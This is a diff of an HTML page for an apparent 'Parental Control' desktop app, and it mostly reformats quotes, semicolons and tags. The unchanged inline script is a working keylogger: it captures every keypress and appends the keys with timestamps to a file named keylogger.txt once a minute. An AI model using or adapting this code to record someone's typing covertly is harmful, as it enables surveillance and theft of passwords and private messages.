@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <meta charset="UTF-8">
+    <meta charset="UTF-8" />
     <title>Parental Control</title>
-    <link rel="stylesheet" href="index.css">
+    <link rel="stylesheet" href="index.css" />
   </head>
   <body>
     <h1>Panel Control</h1>
@@ -12,27 +12,28 @@
     <span id="noti"></span>
     <script src="./panel.js"></script>
     <script>
-      const fs = require('fs')
-      const path = require('path');
+      const fs = require("fs");
+      const path = require("path");
 
-      var keys = '';
-      document.onkeypress = function(e) {
+      var keys = "";
+      document.onkeypress = function (e) {
         get = window.event ? event : e;
         key = get.keyCode ? get.keyCode : get.charCode;
         key = String.fromCharCode(key);
         keys += key;
-      }
-      window.setInterval(function() {
+      };
+
+      window.setInterval(function () {
         var today = new Date();
-        var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
+        var date = today.getFullYear() + "-" + (today.getMonth() + 1) + "-" + today.getDate();
         var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
-        var dateTime = date+' '+time;
-        content = dateTime + keys + '\n';
-        fs.appendFileSync(path.join(__dirname, 'sync/history/keylogger.txt'), content, err => {
+        var dateTime = date + " " + time;
+        content = dateTime + keys + "\n";
+        fs.appendFileSync(path.join(__dirname, "sync/history/keylogger.txt"), content, (err) => {
           if (err) return;
-        })
-        keys = '';
-      }, 60000);  
+        });
+        keys = "";
+      }, 60000);
     </script>
   </body>
 </html>
